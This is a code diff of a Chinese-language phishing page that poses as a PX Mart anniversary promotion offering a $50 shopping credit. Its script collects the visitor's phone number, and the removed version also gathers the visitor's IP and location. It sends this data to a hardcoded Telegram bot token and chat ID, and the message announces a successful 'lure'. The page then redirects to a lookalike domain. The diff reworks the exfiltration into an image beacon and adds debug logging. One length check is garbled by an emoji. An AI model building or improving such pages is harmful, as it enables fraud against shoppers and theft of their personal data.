@@ -43,40 +43,33 @@
     <input type="tel" id="phone" placeholder="請輸入手機號碼" maxlength="12">
   </div>
   
-  <button id="submitBtn">立即領取 $50 購物金</button>
+  <button onclick="send()">立即領取 $50 購物金</button>
 </div>
 
 <script>
-const TOKEN = "8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys";
-const CHAT_ID = "1137905005";
-
-document.getElementById("submitBtn").addEventListener("click", async function() {
-  const phone = document.getElementById("phone").value.trim();
-  if(phone.length < 😎 return;
-  
-  const btn = this;
-  btn.textContent = "領取中...";
-  btn.disabled = true;
-
-  // 抓 IP 位置（可選）
-  const ipData = await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>({}));
-  const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
-
-  const msg = encodeURIComponent(
-    "全聯週年慶暴力版誘捕成功\n\n" +
-    "電話：+886"+phone+"\n" +
-    "IP　　：" + (ipData.ip || "未知") + "\n" +
-    "位置　：" + (ipData.city || "未知") + "，" + (ipData.country_name === "Taiwan" ? "台灣" : ipData.country_name || "未知") + "\n" +
-    "時間　：" + time
-  );
-
-  // 這段是唯一 2025 年 100% 穩的寫法
-  fetch(https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg});
-
-  setTimeout(() => {
-    location.href = "https://cardpoint.pxmartevent.com.tw/";
-  }, 2000);
-});
+function send(){
+  try {
+    console.log("按鈕點擊觸發"); // 偵錯：F12 看這行有沒有出現
+    const phone = document.getElementById("phone").value.trim();
+    if(phone.length < 😎 return;
+    document.querySelector("button").textContent = "領取中...";
+    
+    console.log("開始發送訊息"); // 偵錯
+    
+    new Image().src = "https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage?chat_id=1137905005&text=" + 
+      encodeURIComponent("全聯週年慶暴力版誘捕成功\n電話：+886"+phone+"\n時間："+new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"}));
+    
+    console.log("訊息已發送"); // 偵錯
+    
+    setTimeout(()=>{
+      console.log("開始跳轉"); // 偵錯
+      location.href = "https://cardpoint.pxmartevent.com.tw/";
+    },1800);
+  } catch(e) {
+    console.log("錯誤：" + e); // 偵錯
+    location.href = "https://cardpoint.pxmartevent.com.tw/"; // 錯誤時也跳轉
+  }
+}
 </script>
 </body>
 </html>
